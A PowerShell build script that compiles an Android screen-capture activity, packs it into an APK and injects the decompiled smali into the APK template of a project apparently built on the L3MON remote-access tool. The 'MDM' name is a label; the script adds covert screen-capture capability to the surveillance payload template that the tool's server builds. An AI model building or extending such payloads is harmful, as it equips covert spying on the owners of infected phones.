$ErrorActionPreference = "Stop"

$baseDir = "C:\Users\User\Downloads\PROYECTOS DE GOOGLE ANTIGRAVITY\L3MON-main\MDM_FINAL_AUTOMATION"
if (Test-Path $baseDir) { Remove-Item -Path $baseDir -Recurse -Force }
New-Item -ItemType Directory -Force -Path "$baseDir\com\etechd\l3mon"
New-Item -ItemType Directory -Force -Path "$baseDir\io\socket\client"

# 1. Prepare Java files
Copy-Item "C:\Users\User\Downloads\PROYECTOS DE GOOGLE ANTIGRAVITY\android-device-manager\android-studio-source\java\com\etechd\l3mon\*.java" -Destination "$baseDir\com\etechd\l3mon\" -Force

$mdmActivityCode = 'package com.etechd.l3mon;
import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
public class MDMActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        String action = getIntent().getStringExtra("action");
        if ("screenshot".equals(action)) {
            MediaProjectionManager manager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            if (manager != null) { startActivityForResult(manager.createScreenCaptureIntent(), 1001); } else { finish(); }
        } else { finish(); }
    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1001) {
            if (resultCode == -1 && data != null) { MDMActionHandler.startScreenCaptureService(this, data); }
            finish();
        }
    }
}'
Set-Content -Path "$baseDir\com\etechd\l3mon\MDMActivity.java" -Value $mdmActivityCode

Set-Content -Path "$baseDir\com\etechd\l3mon\IOSocket.java" -Value 'package com.etechd.l3mon; public class IOSocket { public static IOSocket getInstance() { return null; } public io.socket.client.Socket getIoSocket() { return null; } }'
Set-Content -Path "$baseDir\io\socket\client\Socket.java" -Value 'package io.socket.client; public class Socket { public boolean connected() { return false; } public Socket emit(String event, Object... args) { return this; } }'

# 2. Compile
$androidJar = "C:\Users\User\AppData\Local\Android\Sdk\platforms\android-34\android.jar"
$javac = "C:\Program Files\Java\jdk-17\bin\javac.exe"
& $javac -cp $androidJar -d "$baseDir" "$baseDir\com\etechd\l3mon\*.java" "$baseDir\io\socket\client\*.java"

# 3. DEX
$d8 = "C:\Users\User\AppData\Local\Android\Sdk\build-tools\34.0.0\d8.bat"
$classes = Get-ChildItem -Path "$baseDir" -Recurse -Filter "*.class" | Select-Object -ExpandProperty FullName
& $d8 --min-api 26 --output "$baseDir" $classes

# 4. Decompile
$apktool = "C:\Users\User\Downloads\PROYECTOS DE GOOGLE ANTIGRAVITY\ARCHIVOS EXTRAS\apktool.jar"
$baseApk = "C:\Users\User\Downloads\PROYECTOS DE GOOGLE ANTIGRAVITY\L3MON-main\L3MON-main\app\factory\base.apk"
Copy-Item $baseApk -Destination "$baseDir\dummy.apk" -Force
& "C:\Program Files\Java\jdk-17\bin\jar.exe" uf "$baseDir\dummy.apk" -C "$baseDir" classes.dex
java -jar $apktool d "$baseDir\dummy.apk" -o "$baseDir\out_smali" -f

# 5. Copy to Template
$templateDir = "C:\Users\User\Downloads\PROYECTOS DE GOOGLE ANTIGRAVITY\android-device-manager\server\assets\apk-template\smali\com\etechd\l3mon"
Get-ChildItem -Path "$baseDir\out_smali\smali\com\etechd\l3mon\MDM*" | Copy-Item -Destination $templateDir -Force
Get-ChildItem -Path "$baseDir\out_smali\smali\com\etechd\l3mon\Screen*" | Copy-Item -Destination $templateDir -Force

Write-Output "SMALI_INJECTED_SUCCESSFULLY"
